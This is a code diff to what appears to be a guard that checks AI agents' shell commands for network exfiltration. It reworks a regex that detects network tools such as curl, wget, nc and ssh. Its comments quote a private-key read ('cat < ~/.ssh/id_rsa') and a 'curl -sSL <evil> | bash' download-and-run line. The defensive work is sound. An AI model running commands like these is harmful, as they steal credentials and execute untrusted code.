@@ -5,7 +5,7 @@ import { askNativePopup } from '../ui/native';
 import { computeRiskMetadata, type RiskMetadata } from '../context-sniper';
 import { scanArgs, scanFilePath, detectArgsPii, matchCanaryArgs, type DlpMatch } from '../dlp';
 import { canaryValues, loadCanaries } from '../canary/registry';
-import { ssrfDestinationFloor } from '@node9/policy-engine';
+import { ssrfDestinationFloor, NET_BINARIES } from '@node9/policy-engine';
 import { extractShellDestinations, evaluateEgress } from '@node9/policy-engine';
 import { appendHookDebug, appendLocalAudit, appendToLog, HOOK_DEBUG_LOG } from '../audit';
 import { getConfig, getCredentials } from '../config';
@@ -124,13 +124,27 @@ function extractFilePaths(toolName: string, args: unknown): string[] {
  * Returns true if this is a shell/network tool that could exfiltrate a file.
  * Used to decide whether to run a taint check.
  */
+// Built from the engine's NET_BINARIES so this list and the destination
+// extractor's cannot drift.
+//
+// The lookbehind is the whole fix and its SHAPE matters. A bare `\b` matched
+// `ssh` INSIDE `.ssh/`, so `cat < ~/.ssh/id_rsa` was classed as a network call,
+// entered the taint tier, and with the daemon down came back `ask` ("Taint
+// service unavailable") instead of the jail's block. A command-POSITION anchor
+// (`^` or whitespace) fixes that but DROPS `/usr/bin/curl`, `sh -c "curl …"`
+// and `{curl …;}` -- all matched before, all real network calls, all would
+// silently leave the taint tier. The discriminator between the two is a DOT:
+// `.ssh` is a dotfile, while a slash or a quote before the name is just a path
+// or a payload. Measured over 13 shapes, 2026-09-11.
+const NETWORK_COMMAND_RE = new RegExp(`(?<![.\\w-])(${[...NET_BINARIES].join('|')})\\b`);
+
 function isNetworkTool(toolName: string, args: unknown): boolean {
   const t = toolName.toLowerCase();
   if (t === 'bash' || t === 'shell' || t === 'run_shell_command' || t === 'terminal.execute') {
     const a = args as Record<string, unknown> | null;
     const cmd =
       typeof a?.command === 'string' ? a.command : typeof a?.cmd === 'string' ? a.cmd : '';
-    return /\b(curl|wget|scp|rsync|nc|ncat|netcat|ssh)\b/.test(cmd);
+    return NETWORK_COMMAND_RE.test(cmd);
   }
   return false;
 }
@@ -1160,14 +1174,6 @@ async function _authorizeHeadlessCore(
     }
   }
 
-  // Trust session bypass — only for review-path calls, never for taint detection.
-  // Runs after hard-block evaluation so block-verdict rules are always enforced.
-  // Round-3 F1b: a DOWNGRADED hard block (an intrinsic exfil/RCE block softened
-  // to review) must not be resolved by a prior time-boxed "always allow" trust
-  // grant either — same non-human-channel class as the persistent consult
-  // (:951) and the cloud guards below. Trust matches on the first two command
-  // words, so a benign `curl -sSL <x>` grant would otherwise auto-allow a later
-  // `curl -sSL <evil> | bash`. Fail closed: a downgraded block skips trust.
   if (
     !taintWarning &&
     !appPermReview &&
